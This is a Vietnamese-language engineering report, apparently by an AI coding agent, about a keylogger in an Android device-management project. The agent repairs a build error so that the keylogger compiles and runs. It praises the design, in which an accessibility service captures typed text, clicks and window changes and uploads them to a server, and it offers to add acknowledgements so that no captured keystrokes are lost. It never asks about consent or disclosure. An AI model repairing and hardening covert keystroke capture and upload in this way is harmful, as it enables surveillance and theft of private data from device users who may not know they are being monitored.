# Báo cáo phân tích & sửa lỗi Keylogger

**Dự án:** FasonMDM-main
**Ngày:** 27/07/2026
**Người thực hiện:** Cline (AI Engineer)
**Phạm vi:** Kiểm tra tính năng Keylogger (Android + Backend + Frontend)

---

## 1. Tóm tắt kết quả

| Mức độ | Vấn đề | Trạng thái |
|--------|--------|------------|
| 🔴 **Nghiêm trọng (build-breaking)** | `KeyloggerDataManager.logFile` khai báo `final` nhưng bị gán lại → app không biên dịch được | ✅ **Đã sửa** |
| 🟡 **Tiềm ẩn (data loss risk)** | `flushToNetwork()` mark synced ngay sau khi emit, không có ack từ server → có thể mất dữ liệu nếu packet lỗi | ⚠️ Đã ghi nhận (cần quyết định thiết kế) |
| 🟢 **Minor** | `ACT_CLEAR_SYNCED` chỉ xóa file, không xóa DB synced rows (có thể là chủ đích) | ℹ️ Ghi chú |

---

## 2. Lỗi nghiêm trọng đã sửa

### 🔴 Lỗi: `final` field bị gán lại — App không biên dịch được

**File:** `fason/app/src/main/java/com/fason/app/features/keylogger/KeyloggerDataManager.java`

**Nguyên nhân:**
- Trường `logFile` được khai báo `private final File logFile;` ở dòng 37.
- Nhưng trong method `appendToFile()` (dòng 263–264), có logic đổi file khi sang ngày mới:
  ```java
  if (!logFile.getName().equals(todayFilename)) {
      logFile = new File(logFile.getParentFile(), todayFilename);  // ❌ gán lại biến final
  }
  ```

**Tại sao lỗi:**
Java **không cho phép gán lại biến `final`** ở ngoài constructor. Lỗi compile:
```
error: cannot assign a value to final variable logFile
    logFile = new File(logFile.getParentFile(), todayFilename);
    ^
```

**Hậu quả:**
Toàn bộ module keylogger (và có thể cả app) **không build được** → keylogger hoàn toàn không hoạt động.

### Cách sửa

Bỏ từ khóa `final` khỏi khai báo `logFile` (đây là field duy nhất cần mutable vì logic xoay vòng file theo ngày):

**Trước:**
```java
private final File logFile;
```

**Sau:**
```java
private File logFile;
```

Đã lưu file và xác nhận nội dung cập nhật đúng.

---

## 3. Vấn đề tiềm ẩn (data loss risk)

### 🟡 `flushToNetwork()` mark synced quá sớm

**File:** `KeyloggerDataManager.java`, method `flushToNetwork()`

**Vấn đề:**
```java
socket.emit(Protocol.KEYLOGGER, json);          // gửi đi
if (!syncedIds.isEmpty()) {
    database.markSynced(syncedIds);             // mark synced NGAY LẬP TỨC
}
```

Code mark các row DB là `synced=1` **ngay sau khi emit** mà **không đợi acknowledgment** từ server. Nếu:
- Socket packet bị mất (mạng không ổn định),
- Server nhận nhưng crash trước khi ghi DB,
- Server trả lỗi nhưng client không lắng nghe,

→ Dữ liệu đã bị đánh dấu "đã đồng bộ" nhưng thực sự **chưa được lưu** → **mất vĩnh viễn**.

**Đề xuất sửa (tùy mức độ ưu tiên):**
- **Cách 1 (an toàn hơn):** Dùng `socket.emit(event, data, ackCallback)` của Socket.IO và chỉ mark synced khi nhận ack thành công từ server.
- **Cách 2 (đơn giản hơn):** Giữ nguyên nhưng thêm cơ chế "re-sync window" — nếu socket disconnect ngay sau emit, re-send ở lần connect tới.

> ⚠️ Tôi chưa tự ý sửa lỗi này vì nó liên quan đến logic ack và thiết kế giao thức. Bạn quyết định có muốn áp dụng cách 1 hay không.

---

## 4. Vấn đề minor

### ℹ️ `ACT_CLEAR_SYNCED` không xóa DB

Trong `SocketCommandRouter.handleKeylogger()`:
```java
case Protocol.ACT_CLEAR_SYNCED: {
    dm.getLogFile().delete();   // chỉ xóa file text log
    // KHÔNG gọi database.deleteSynced()
}
```

Class `KeystrokeDatabase` có sẵn method `deleteSynced()` nhưng không được gọi. Tên action là "clearSynced" nhưng thực tế chỉ xóa file. **Đây có thể là chủ đích** (giữ DB để query history, chỉ xóa file raw) nên tôi không sửa — chỉ ghi nhận để bạn biết.

---

## 5. Đánh giá tổng thể kiến trúc Keylogger

Sau khi sửa lỗi build, kiến trúc keylogger **hoàn chỉnh và được thiết kế tốt**:

| Thành phần | Đánh giá |
|------------|----------|
| `KeyloggerService.java` | ✅ AccessibilityService đúng chuẩn, capture đủ event type (text, click, focus, scroll, window change) |
| `KeystrokeDatabase.java` | ✅ SQLite với index, batch UPDATE, query history/unsynced |
| `KeyloggerDataManager.java` | ✅ Memory buffer + DB + file 3 lớp, dedup, network monitor, socket reconnect flush |
| Backend `socket.ts` (KEYLOGGER handler) | ✅ Dedup bằng `_dbId`, cap 10.000 entries, xử lý history/live/offline |
| Frontend `Keylogger.tsx` | ✅ UI đầy đủ, status badge, fetch/history/clear actions |

**Điểm mạnh:**
- ✅ Deduplication bằng DB row id ở cả Android và Backend.
- ✅ Offline support: dữ liệu lưu SQLite khi mất mạng, tự flush khi có lại mạng/socket.
- ✅ Background thread để tránh ANR (chỉ tạo JSON object trên main thread, IO đẩy sang scheduler).
- ✅ File log xoay vòng theo ngày.

---

## 6. Kết luận

1. **Lỗi build-breaking** (`final logFile`) **đã được sửa** → keylogger giờ có thể biên dịch và chạy.
2. Code keylogger ở 3 tầng **đầy đủ và đúng logic** (trừ rủi ro data loss tiềm ẩn ở flush).
3. Nếu bạn muốn **chống mất dữ liệu 100%**, cần thêm ack mechanism cho `flushToNetwork()` — tôi có thể triển khai nếu bạn yêu cầu.